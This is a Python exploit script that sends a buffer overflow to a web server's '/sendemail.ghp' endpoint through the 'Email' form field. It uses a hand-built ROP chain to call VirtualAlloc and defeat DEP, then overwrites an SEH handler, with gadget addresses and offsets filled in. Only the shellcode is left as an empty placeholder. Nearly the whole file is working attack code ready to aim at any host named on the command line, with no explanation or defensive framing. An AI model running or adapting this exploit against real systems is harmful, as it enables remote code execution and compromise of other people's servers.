#!/usr/bin/python
import socket
import sys
from struct import pack
import time
import requests

server = sys.argv[1]
port = 80
payload = b"" # ADD PAYLOAD


def main():
    va =  pack("<L", (0x1004d1fc)) # dummy VirtualAlloc Address
    va += pack("<L", (0x46464646)) # Shellcode Return Address
    va += pack("<L", (0x47474747)) # # dummy Shellcode Address
    va += pack("<L", (0x48484848)) # dummy dwSize
    va += pack("<L", (0x49494949)) # # dummy flAllocationType
    va += pack("<L", (0x51515151)) # dummy flProtect

    rop =  b""
    ### ESP to ESI
    # 0x10019f47: pop edi ; ret  ;  (1 found)
    rop += pack("<L", (0x10019f47))
    rop += pack("<L", (0x1002D6B3)) # Data address to EDI
    # 0x10024b7d: pop edx ; or bl, byte [edi+0x5E] ; pop ebp ; pop ebx ; add esp, 0x24 ; ret  ;  (1 found)
    rop += pack("<L", (0x10024b7d))
    rop += (pack("<L", (0x1002D6B3))*3) # Data address to EDX, EBP, EBX
    rop += (pack("<L", (0x42424242))*9) # Junk for ADD ESP, 0x24 (0n36)
    # 0x100238cc: push esp ; and al, 0x10 ; pop esi ; mov dword [edx], ecx ; ret  ;  (1 found)
    rop += pack("<L", (0x100238cc))    
    rop += pack("<L", (0x1001e15a)) # mov eax, esi ; pop esi ; ret
    rop += pack("<L", (0x50505050))

    '''
    0x1001b577: pop ecx ; ret  ;  (1 found)
    0x100231d1: neg eax ; ret  ;  (1 found)
    0x1001283e: sub eax, ecx ; ret  ;  (1 found)
    0x100231d1: neg eax ; ret  ;  (1 found)
    '''
    rop += pack("<L", (0x1001b577)) # pop ecx ; ret
    rop += pack("<L", (0xFFFFFFA4)) # -5C
    rop += pack("<L", (0x100231d1)) # neg eax ; ret
    rop += pack("<L", (0x1001283e)) # sub eax, ecx ; ret
    rop += pack("<L", (0x100231d1)) # neg eax ; ret

    '''
    0x1001c881: pop ebx ; ret  ;  (1 found)
    0x1002D6B3 + 0x3874FB3C
    0x1001995b: xchg eax, ecx ; adc al, 0x00 ; add byte [ebx-0x3874FB3C], al ; pop edi ; pop esi ; ret  ;  (1 found)
    junk * 2
    0x1001fa0d: mov eax, ecx ; ret  ;  (1 found)
    '''
    rop += pack("<L", (0x1001c881)) # pop ebx ; ret
    rop += pack("<L", (0x4877D1EF)) # 0x1002D6B3 + 0x3874FB3C
    rop += pack("<L", (0x1001995b)) # xchg eax, ecx ; adc al, 0x00 ; add byte [ebx-0x3874FB3C], al ; pop edi ; pop esi ; ret
    rop += pack("<L", (0x50505050)) # junk
    rop += pack("<L", (0x50505050)) # junk
    rop += pack("<L", (0x1001fa0d)) # mov eax, ecx ; ret

    rop += pack("<L", (0x1002248c)) # mov eax, dword [eax] ; ret
    rop += pack("<L", (0x1002248c)) # mov eax, dword [eax] ; ret
    rop += pack("<L", (0x1001da08)) # mov dword [ecx], eax ; ret

    '''
    mov eax, ecx ; ret
    0x10022199: inc eax ; ret  ;  (1 found) * 4
    --- Move EAX to ECX:
    0x1001c881: pop ebx ; ret  ;  (1 found)
    0x1002D6B3 + 0x3874FB3C
    0x1001995b: xchg eax, ecx ; adc al, 0x00 ; add byte [ebx-0x3874FB3C], al ; pop edi ; pop esi ; ret  ;  (1 found)
    junk * 2
    0x1001fa0d: mov eax, ecx ; ret  ;  (1 found)
    --- EAX = EAX + 0x120
    rop += (pack("<L", (0x10019457))*9) # 0x10019457: add eax, 0x20 ; ret  ;  (1 found) -> EAX = EAX + 0x120
    rop += pack("<L", (0x1001da08)) # mov dword [ecx], eax ; ret
    '''
    # Return address
    rop += pack("<L", (0x1001fa0d)) # mov eax, ecx ; ret
    rop += (pack("<L", (0x10022199))*4) # inc eax
    rop += pack("<L", (0x1001c881)) # pop ebx ; ret
    rop += pack("<L", (0x4877D1EF)) # 0x1002D6B3 + 0x3874FB3C
    rop += pack("<L", (0x1001995b)) # xchg eax, ecx ; adc al, 0x00 ; add byte [ebx-0x3874FB3C], al ; pop edi ; pop esi ; ret
    rop += pack("<L", (0x50505050)) # junk
    rop += pack("<L", (0x50505050)) # junk
    rop += pack("<L", (0x1001fa0d)) # mov eax, ecx ; ret
    rop += (pack("<L", (0x10019457))*21) # 0x10019457: add eax, 0x20 ; ret  ;  (1 found) -> EAX = EAX + 0x120
    rop += pack("<L", (0x1001da08)) # mov dword [ecx], eax ; ret
    
    # lpAddress
    rop += pack("<L", (0x1001fa0d)) # mov eax, ecx ; ret
    rop += (pack("<L", (0x10022199))*4) # inc eax
    rop += pack("<L", (0x1001c881)) # pop ebx ; ret
    rop += pack("<L", (0x4877D1EF)) # 0x1002D6B3 + 0x3874FB3C
    rop += pack("<L", (0x1001995b)) # xchg eax, ecx ; adc al, 0x00 ; add byte [ebx-0x3874FB3C], al ; pop edi ; pop esi ; ret
    rop += pack("<L", (0x50505050)) # junk
    rop += pack("<L", (0x50505050)) # junk
    rop += pack("<L", (0x1001fa0d)) # mov eax, ecx ; ret
    rop += (pack("<L", (0x10019457))*21) # 0x10019457: add eax, 0x20 ; ret  ;  (1 found) -> EAX = EAX + 0x120
    rop += (pack("<L", (0x1001614d))*4) # 0x1001614d: dec eax ; ret  ;  (1 found) * 4
    rop += pack("<L", (0x1001da08)) # mov dword [ecx], eax ; ret

    # dwSize 1
    rop += pack("<L", (0x1001fa0d)) # mov eax, ecx ; ret
    rop += (pack("<L", (0x10022199))*4) # inc eax
    rop += pack("<L", (0x1001c881)) # pop ebx ; ret
    rop += pack("<L", (0x4877D1EF)) # 0x1002D6B3 + 0x3874FB3C
    rop += pack("<L", (0x1001995b)) # xchg eax, ecx ; adc al, 0x00 ; add byte [ebx-0x3874FB3C], al ; pop edi ; pop esi ; ret
    rop += pack("<L", (0x50505050)) # junk
    rop += pack("<L", (0x50505050)) # junk
    rop += pack("<L", (0x10015442)) # pop eax
    rop += pack("<L", (0xFFFFFFFF)) # -1
    rop += pack("<L", (0x100231d1)) # neg eax
    rop += pack("<L", (0x1001da08)) # mov dword [ecx], eax ; ret

    # flAllocationType 1000
    rop += pack("<L", (0x1001fa0d)) # mov eax, ecx ; ret
    rop += (pack("<L", (0x10022199))*4) # inc eax
    rop += pack("<L", (0x1001c881)) # pop ebx ; ret
    rop += pack("<L", (0x4877D1EF)) # 0x1002D6B3 + 0x3874FB3C
    rop += pack("<L", (0x1001995b)) # xchg eax, ecx ; adc al, 0x00 ; add byte [ebx-0x3874FB3C], al ; pop edi ; pop esi ; ret
    rop += pack("<L", (0x50505050)) # junk
    rop += pack("<L", (0x50505050)) # junk
    rop += pack("<L", (0x10015442)) # pop eax
    rop += pack("<L", (0xFFFFF001)) # -FFF
    rop += pack("<L", (0x100231d1)) # neg eax
    rop += pack("<L", (0x10022199)) # 0x10022199: inc eax ; ret
    rop += pack("<L", (0x1001da08)) # mov dword [ecx], eax ; ret

    # flProtect 40
    rop += pack("<L", (0x1001fa0d)) # mov eax, ecx ; ret
    rop += (pack("<L", (0x10022199))*4) # inc eax
    rop += pack("<L", (0x1001c881)) # pop ebx ; ret
    rop += pack("<L", (0x4877D1EF)) # 0x1002D6B3 + 0x3874FB3C
    rop += pack("<L", (0x1001995b)) # xchg eax, ecx ; adc al, 0x00 ; add byte [ebx-0x3874FB3C], al ; pop edi ; pop esi ; ret
    rop += pack("<L", (0x50505050)) # junk
    rop += pack("<L", (0x50505050)) # junk
    rop += pack("<L", (0x10015442)) # pop eax
    rop += pack("<L", (0xFFFFFFC0)) # -40
    rop += pack("<L", (0x100231d1)) # neg eax
    rop += pack("<L", (0x1001da08)) # mov dword [ecx], eax ; ret

    '''
    neg eax
    0x10020364: pop ebx ; ret  ;  (1 found)
    - 1
    pop ebp
    - 1
    0x1001da09: add ebx, eax ; mov eax, dword [esp+0x0C] ; inc dword [eax] ; ret  ;  (1 found)
    0x1001d78a: sub ebp, ebx ; or dh, dh ; ret  ;  (1 found)
    '''
    # Call VirtualAlloc
    rop += pack("<L", (0x1001fa0d)) # mov eax, ecx ; ret
    rop += pack("<L", (0x100231d1)) # neg eax
    rop += pack("<L", (0x10020364)) # pop ebx; ret
    rop += pack("<L", (0xFFFFFFFF)) # -1
    rop += pack("<L", (0x10014236)) # pop ebp ; ret
    rop += pack("<L", (0xFFFFFFE7)) # -19
    rop += pack("<L", (0x1001da09)) # 0x1001da09: add ebx, eax ; mov eax, dword [esp+0x0C] ; inc dword [eax] ; ret  ;  (1 found)
    rop += pack("<L", (0x1001d78a)) # 0x1001d78a: sub ebp, ebx ; or dh, dh ; ret  ;  (1 found)
    rop += pack("<L", (0x1001f9bb)) # retn 0x0004
    rop += pack("<L", (0x10022e2e)) # ret
    rop += pack("<L", (0x1002D6B3)) # Data address for add ebx, eax ; mov eax, dword [esp+0x0C] ; inc dword [eax] ; ret  ;  (1 found)
    rop += (pack("<L", (0x10013a52))) # 0x10013a52: mov esp, ebp ; pop ebp ; ret  ;  (1 found)

    buffer =  b"A"*(2512 - len(va))
    buffer += va
    buffer += pack("<L", (0x10022e2e)) # 0x10022e2e: ret  ;  (1 found)
    buffer += rop
    buffer += (b"\x90"*30)
    buffer += payload
    buffer += b"E"*(1544-len(rop) - 30 - len(payload))
    buffer += b"BBBB" # nseh
    buffer += pack("<L", (0x1002280a))  #  bp 0x1002280a; g //// add esp, 0x00001004 ; ret  ;
    buffer += b"D"*(10000-len(buffer))
    requests.post("http://%s:%d/sendemail.ghp" % (server, port), headers={"Content-Type": "application/x-www-form-urlencoded"}, data=b"Email=%s&getPassword=Get+Password" % buffer)


main()